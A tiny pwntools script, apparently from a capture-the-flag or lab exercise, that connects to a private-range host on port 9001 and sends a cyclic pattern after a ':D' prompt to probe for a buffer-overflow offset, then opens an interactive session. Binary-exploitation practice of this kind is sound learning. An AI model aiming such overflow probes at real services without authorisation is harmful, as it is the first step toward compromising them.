from pwn import *

p = remote("10.10.138.24", 9001)

p.sendlineafter(":D", b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa")

p.interactive()
